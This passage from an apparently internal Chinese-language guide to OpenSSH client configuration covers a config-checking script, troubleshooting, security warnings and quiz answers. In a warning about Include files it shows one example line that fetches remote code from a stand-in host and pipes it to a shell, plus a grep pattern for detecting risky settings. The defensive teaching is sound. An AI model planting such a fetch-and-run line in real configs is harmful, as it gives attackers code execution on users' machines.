           FC=1; continue; }
    d=""
    for k in hostname:$gh:$eh user:$gu:$eu port:$gp:$ep proxyjump:$gj:$ej; do
        n=${k%%:*}; v=${k#*:}; test "${v%:*}" = "${v#*:}" \
          || d="$d\n      $n: 期望 ${v#*:} 實得 ${v%:*}"
    done
    if test -z "$d"; then ok "$a → $gu@$gh:$gp (jump=$gj)"
    else bad "$a 設定不符："; printf "%b\n" "$d"
         echo "      提示：ssh -vvv $a true 2>&1 | grep 'Applying options'"
         echo "            看哪個區塊【先】被套用 —— 第一個值勝出。"; FC=1; fi
done < "$EXPECT"

if test "$CONNECT" -eq 1; then
    sect "2. 連通測試（BatchMode，不互動、不問密碼）"
    while read -r a _r; do
        test -n "${a:-}" || continue; case "$a" in \#*) continue;; esac
        if out=$(ssh -o BatchMode=yes -o ConnectTimeout=5 \
                     -o StrictHostKeyChecking=accept-new \
                     "$a" 'echo OK; id -un; hostname -s' 2>&1)
        then ok "$a 連通 → $(printf '%s' "$out" | tr '\n' ' ')"
        else bad "$a 連線失敗："; printf '%s\n' "$out" | sed 's/^/      /'; FN=1; fi
    done < "$EXPECT"
else sect "2. 連通測試（-n 已略過）"; fi

sect "結果"
test "$FC" -eq 0 && echo "設定比對：通過" || echo "設定比對：不通過"
test "$CONNECT" -eq 1 && { test "$FN" -eq 0 && echo "連通測試：通過" \
                                            || echo "連通測試：不通過"; }
test "$FC" -eq 0 || exit 1; test "$FN" -eq 0 || exit 2
SCRIPT
```

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| **改了 `User` 卻沒生效，`ssh -G` 也顯示舊值** ★★★★★ | **`Host *` 排在前面**，第一個值勝出 | 把 `Host *` 移到檔案**最後**；`ssh -vvv \| grep 'Applying options'` 確認順序 |
| **`ssh -G` 顯示新值，實際連進去還是舊行為** ★★★★ | **ControlPersist 的舊 socket 還活著** | `ssh -O exit <別名>`；或 `rm -f ~/.ssh/cm/*` |
| `Bad owner or permissions on ~/.ssh/config` ★★★★ | group/other 可寫，或 owner 不是自己（`sudo vim` 造成） | `sudo chown $USER:$USER ~/.ssh/config && chmod 600` |
| **`terminating, 1 bad configuration options`，ssh／git／rsync 全掛** ★★★★ | config 有拼錯的關鍵字 | 照錯誤行號改，再跑 `ssh -G <任意別名>` |
| `Too many authentication failures` ★★★★ | agent 金鑰太多，超過伺服器 `MaxAuthTries`（預設 6） | 該 Host 加 `IdentitiesOnly yes` + 明確 `IdentityFile` |
| **`ssh -G` 的 `hostname` 等於你打的別名** ★★★★ | **沒有任何 `Host` 區塊匹配到**（拼字、大小寫、多餘空白） | 檢查拼字；`ssh -vvv` 看有沒有 `Applying options for <別名>` |
| `ControlPath too long ('...' >= 108 bytes)`、**`ControlSocket ... already exists, disabling multiplexing`** ★★★ | UNIX socket 路徑上限 108 bytes；上次 ssh 被 `kill -9` socket 沒清掉 | 改成 `ControlPath ~/.ssh/cm/%C`；`rm -f ~/.ssh/cm/<那個檔>`（`Control socket connect: No such file` 是**正常現象**，不用理） |
| **`Match host 10.10.*` 完全不生效** ★★★ | 該別名的 `HostName` 還沒設，`%h` 仍是別名 | `Match` 要排在設 `HostName` 的 `Host` 區塊**之後**；或用 `Match final host` |
| 閒置 5 分鐘就 `packet_write_wait: Broken pipe` ★★★ | NAT／狀態防火牆清掉閒置連線 | `Host *` 加 `ServerAliveInterval 30` / `ServerAliveCountMax 3` |
| **`ssh -J` 連得上但 `ssh <別名>` 連不上** ★★★ | `ProxyJump` 指的別名不存在或排在後面沒讀到 | `ssh -G <別名> \| grep proxyjump`；再驗跳板別名本身 |
| **`Permission denied (publickey)` 但金鑰百分之百正確** ★★★★ | 走到 ControlMaster 舊連線；或 `IdentityFile` 路徑打錯（ssh **不會**因檔案不存在而報錯） | `ssh -O exit`；`ssh -G x \| grep identityfile` 後 `ls -l` 確認檔案存在 |
| **`REMOTE HOST IDENTIFICATION HAS CHANGED!`** ★★★★★ | 主機金鑰變了：重灌／換機／**或中間人攻擊** | **★★★★★ 先確認是不是自己重灌的**；是才 `ssh-keygen -R <host>`；不是就通報資安 |
| WSL 連不上但 Windows 可以；VS Code Remote-SSH 訊息看不懂 ★★★ | 兩套獨立的 OpenSSH 與 config；VS Code 吞掉 ssh 的錯誤 | WSL 裡也放一份；回終端機跑 `ssh -G`、`ssh -vvv` |

## 安全性注意事項

> [!danger] 絕對禁止的四件事 ★★★★★
> ```text
> ① ★★★★★ 把私鑰複製到跳板機（`scp ~/.ssh/id_ed25519_prod bastion:~/.ssh/`）——
>    跳板機是對外開放、被掃描最頻繁的機器，一旦被入侵，攻擊者拿到的不是一台機器，
>    是【內網所有機器的鑰匙】。正解：ProxyJump，認證只在筆電做。
> ② ★★★★★ StrictHostKeyChecking no + UserKnownHostsFile /dev/null —— 中間人可冒充任何
>    伺服器，完整看到你輸入的 sudo 密碼、DB 密碼、API token，而且【事後查不出來】。
>    ★★★★ 對機關而言這是「稽核軌跡不完整」，稽核直接失分。正解：`accept-new`。
> ③ ★★★★★ 把 config、known_hosts、私鑰推到【公開】repo —— 跳板機外網 IP + 非標準 port
>    + 有效帳號名，是攻擊者最想要的三件套，★★★★ GitHub 上有專門的爬蟲在找。
>    正解：只推非敏感部分到【私有】repo。
> ④ ★★★★ ForwardAgent yes 寫在 Host * —— 你連上的【每一台】機器上的 root，都能透過
>    `$SSH_AUTH_SOCK` 用你的身分簽章，橫向移動到你有權限的所有機器（agent hijacking）。
>    正解：預設 no，要用才在該次連線加 `-A`。
> ```

> [!warning] 機關情境的四個額外要求 ★★★
> ```text
> ① ★★★★【一人一帳號】Host * 寫 User root = 稽核紀錄全變 root，出事無法追溯。config 的
>    User 應是【個人帳號】，需提權時在伺服器上用 sudo（sudo 有完整 log）。
> ② ★★★【config 是資產清冊，異動要留紀錄】放進內部 git repo，每次異動有 commit 訊息與
>    審核人 —— 同時滿足「組態管理」與「變更管理」（見 [[060-01-01-02-guide-Git-基本工作流程]]）。
> ③ ★★★★【離職／調職的金鑰回收】IdentityFile 命名要能對應「誰的哪把鑰匙」，人員異動時
>    才知道去 authorized_keys 刪哪幾行。★★★ 更好是改用 SSH 憑證（自動過期），
>    見 [[020-02-01-07-svc-SSH-安全強化]]。④ ★★★【最小權限】db01 用 dbadmin、mon01 用 monitor，
>    不要一個 deploy 打天下。
> ```

> [!warning] `Match exec` 與 `Include` 的信任邊界 ★★★★
> ```text
> ★★★★★ Include 進來的檔案 = 你把 shell 執行權交給那個檔案的作者。一行
> `Match exec "curl -s http://evil.example/x | sh"` 放在任何被 Include 的檔案裡，
> ★★★★ 只要你下一次 ssh（甚至 `ssh -G`）就會執行，而 git pull 下來的 config 你通常
> 不會逐行看。★★★ 防護：① repo 開 protected branch + 強制 review；② 部署前掃描
> （下方指令）；③ ★★ 絕不 Include 網路上抄來的 config。
> ```

```bash
$ grep -rnE 'PRIVATE KEY|StrictHostKeyChecking +no|UserKnownHostsFile +/dev/null|ForwardAgent +yes|Match exec|LocalCommand' \
       ~/repos/ssh-config/ && echo "★★★★ 發現高風險設定，禁止合併" || echo "★ 掃描通過"
★ 掃描通過
```

原因是什麼？一行設定怎麼修？

> [!question]- 測驗答案
> **Q1.** **會用 `root`。★★★★★** `ssh_config` 的規則是「**第一個取得的值勝出**」（`man 5
> ssh_config`: *the first obtained value for each parameter will be used*），不是後面蓋
> 前面。`Host *` 排在前面，它的 `User root` 一被讀到就把 `User` 這個參數**鎖死**，
> 後面 `Host web01` 的 `User deploy` 完全被忽略。
> **但 `Port 2222` 會生效** —— 因為 `Host *` 區塊裡**沒有**設定 `Port`，
> 這個參數的「第一個值」就來自 `Host web01`。
> ★★★★ 這種「有些生效有些不生效」正是最難自己想通的地方，很多人因此以為 config 壞了。
> 驗證 `ssh -G web01 | grep -E '^(user|port) '` 會印出 `user root` 與 `port 2222`。
> **修法**：把 `Host *` 移到檔案**最後**。見〈第一個匹配值勝出〉。
>
> **Q2.** **★★★★ ControlPersist 留下的舊 master socket 還活著。** `ssh -G` 讀的是**設定檔**，
> 反映「如果現在建新連線會用什麼參數」；但你的 `ssh web01` **根本沒有建立新連線** ——
> 它接上了背景那個用**舊參數**建立的 socket。
> `User`、`Port`、`IdentityFile`、`ProxyJump` 這些**建線期**參數，在複用連線上完全無效。
> **第一個該下的指令**是 `ssh -O exit web01`（回 `Exit request sent.`），
> 再用 `ls -l ~/.ssh/cm/` 確認對應的 socket 已消失。
> ★★★ 把「改完 config 先 `ssh -O exit`」變成反射動作，能省下大量無謂的除錯。
> 見〈最大的陷阱：舊 socket〉。
>
> **Q3.** **★★★★ 代表沒有任何 `Host` 或 `Match` 區塊匹配到這個別名。** 沒有區塊設定
> `HostName` 時，ssh 直接把你打的字串當成主機名去解析。所以
> 「`hostname` 等於你打的別名」是很好用的**判斷法則**：只要它們一樣（而你期望是某個
> IP），就是匹配失敗。**往三個方向查**：① ★★★ 拼字或大小寫（`Host` 樣式比對**分大小
> 寫**，`Web01` ≠ `web01`）；② ★★★ 該檔案沒被 `Include`（副檔名不是 `.conf`？glob 沒對
> 上？）；③ ★★ 行尾有多餘空白或用了全形字元。確認指令：
> `ssh -vvv -o ConnectTimeout=1 nosuchhost true 2>&1 | grep 'Applying options'`，
> 完全沒有 `Applying options for nosuchhost` 就證實了。見〈排查步驟【1】【2】〉。
>
> **Q4.** **★★★★ `%h` 是對的。** `%h` 展開成 **`HostName`**（解析後的實際位址，如
> `10.10.20.11`）；`%n` 展開成 **originalhost**（你打的別名，如 `web01`）。
> `ProxyCommand` 是**在跳板機上執行**的 —— `ssh -W <目標>:<port>` 的目標必須是
> **跳板機解析得出來的位址**。用 `%n` 的話跳板機收到 `web01` 這個字串，除非跳板機的
> `/etc/hosts` 或內部 DNS 剛好認得，否則會得到
> `ssh: Could not resolve hostname web01: Name or service not known`。
> ★★★ 規則：**`ProxyCommand` / `ProxyJump` 裡一律用 `%h`**；`%n` 的用途是寫 log 或
> `LocalCommand` 時顯示「使用者輸入的別名」。見〈Token 替換〉。
>
> **Q5.** **★★★★★ 錯（非）。跳板機上不需要、也絕不應該有你的私鑰。** `ProxyJump` 建立的是
> **兩層套疊的加密通道**：外層是「你 ↔ 跳板機」，內層是「你 ↔ 目標主機」，內層封包被當成
> **純資料**塞進外層。跳板機上實際執行的是
> `ssh -W <目標>:<port>`（用 `ssh -vvv | grep 'Executing proxy command'` 可驗證），
> 它只做 **TCP 位元組轉發**，**解不開內層加密**，也**不參與目標主機的認證** ——
> 目標主機的挑戰是由**你筆電上**的私鑰（或 agent）簽章回應的。
> ★★★★★ 這正是 `ProxyJump` 相較「登入跳板機再手動 ssh」的最大安全價值：跳板機是最常
> 被攻擊的機器，放私鑰上去等於「一台淪陷＝全內網淪陷」。
> **驗收**：`ssh bastion 'ls ~/.ssh/id_* | wc -l'` 應回 `0`。見〈ProxyJump〉的 ASCII 圖。
>
> **Q6.** **★★★ 因為 UNIX domain socket 的路徑有 108 bytes 硬性上限。** `%r@%h:%p` 展開後
> 長度不固定 —— 家目錄深、FQDN 長、使用者名長很容易爆掉，而且**只在特定主機上爆**，
> 非常難重現。**確切錯誤訊息**是 `ControlPath too long ('...deploy@very.long.fqdn...'
> >= 108 bytes)`。`%C` 是 `%l`（本機 FQDN）`%h``%p``%r``%j`（跳板）的**雜湊**，展開後
> **永遠是固定的 40 個十六進位字元**（`ssh -G web01 | grep '^controlpath'` 可看到
> `~/.ssh/cm/870b88d70468db1aec77e680e51f07854ae36564`）。
> ★★ `%C` 從 OpenSSH 6.7（2014）就有，相容性沒問題。
> ★★★ 另一個好處是 socket 檔名看不出你連了哪台機器。見〈為什麼一定要用 `%C`〉。
>
> **Q7.** **★★★★ 該調客戶端的 `ServerAliveInterval`（配 `ServerAliveCountMax 3`）。三個
> 理由**：① 它是**你能控制的**，不用求伺服器管理員改 `sshd_config`；
> ② 它送的是 **SSH 協定層的加密封包**，NAT 與狀態防火牆看到有實際流量會重置閒置計時器
> （30 秒 ≪ 5 分鐘，很安全）；③ 沒回應時客戶端會**明確報錯**而不是傻等。
> **另外兩個為什麼不行**：`ClientAliveInterval` ★★ 寫在**伺服器端** `sshd_config`，
> 由 sshd 來數，目的是**清掉殭屍工作階段**，你改不到（見 [[020-02-01-04-svc-sshd-伺服器端設定]]）；
> `TCPKeepAlive` ★★★ 是 OS 的 TCP 層，Linux 預設 **7200 秒（2 小時）**才送第一個探測，
> 對「閒置 5 分鐘」完全來不及，而且不加密。
> ★★★ 真正長時間的作業請用 [[060-01-05-01-guide-tmux-工作階段管理]]。見〈連線穩定性三兄弟〉。
>
> **Q8.** **★★★★ 答案是（B）`StrictHostKeyChecking accept-new`。A 為什麼危險**：
> `no` 不只是「沒看過的自動接受」，更致命的是
> **「已經記錄過、但金鑰改變了的主機，也照樣接受」**—— 而「已知主機的金鑰突然變了」
> 正是**中間人攻擊的唯一訊號**。再加上 `UserKnownHostsFile /dev/null` 把驗證結果直接
> 丟棄，★★★★★ 你不但當下被騙，**事後連稽核軌跡都沒有**，對機關是「無法追溯」的重大缺失。
> **B 為什麼安全得多**：`accept-new` 只自動接受**從未見過**的主機，對**金鑰已變更**的
> 主機**仍然拒絕連線並跳出巨大警告**（與預設 `ask` 相同），同時把指紋寫進 `known_hosts`
> 留下紀錄。C（`yes`）需事先佈署好 known_hosts，否則新機器一律連不上；
> D（預設 `ask`）會互動詢問，腳本會卡住。
> ★★★ 想連第一次連線的風險都消除就用 SSH 憑證，見 [[020-02-01-07-svc-SSH-安全強化]]。見〈反面教材〉。
>
> **Q9.** **★★★★ 不會生效。** `Host` 比對的是 **originalhost** ——**你在命令列輸入的那個
> 字串**。你打 `ssh web01`，比對對象就是 `web01`，跟它解析成 `10.10.20.11` **完全無關**
> （`man 5 ssh_config`: *The host is usually the hostname argument given on the command
> line*）。**正確寫法是改用 `Match host`**：在設好 `HostName` 的
> `Host web01` 區塊**之後**寫 `Match host 10.10.* !host 10.10.99.*`，
> 底下放 `IdentityFile ~/.ssh/id_ed25519_prod` 與 `IdentitiesOnly yes`。
> ★★★ 順序有**第二個要求**：`Match host` 必須排在設定 `HostName` 的區塊之後，否則解析
> 到 `Match` 時 `%h` 還是 `web01`，一樣比不到。驗證 `ssh -G web01` 應看到
> `hostname 10.10.20.11` 與 `identityfile ~/.ssh/id_ed25519_prod`。
> 見〈Host 比對的是「你打的字」〉。
>
> **Q10.** **★★★★ ssh-agent 裡金鑰太多，撞到伺服器的 `MaxAuthTries`（預設 6）。** 沒有
> `IdentitiesOnly yes` 時，ssh 會把 **agent 裡每一把金鑰**加上**五個預設路徑**
> （`id_rsa`、`id_ecdsa`、`id_ecdsa_sk`、`id_ed25519`、`id_ed25519_sk`）
> **一把一把送出去試**。試到第 6 把伺服器就直接踢掉連線 ——
> ★★★★ **即使正確的那把排在第 7 位**。這就是「金鑰明明對卻連不上」的成因。
> **一行修法**（寫在該 Host 區塊，不要寫在 `Host *` 以免遺漏個別需求）：
> 在 `Host web01` 底下加 `IdentityFile ~/.ssh/id_ed25519_prod` 與 `IdentitiesOnly yes`。
> **驗證**：`ssh -vv web01 2>&1 | grep -c 'Offering public key'` 應回 `1`（★★★★ 只送一把）。
> ★★★ 附帶的資安好處：不加這行等於把**所有金鑰的公鑰指紋**送給對方伺服器。
> 臨時解法 `ssh-add -D` 治標不治本。見〈`IdentitiesOnly yes` 是必設項〉。
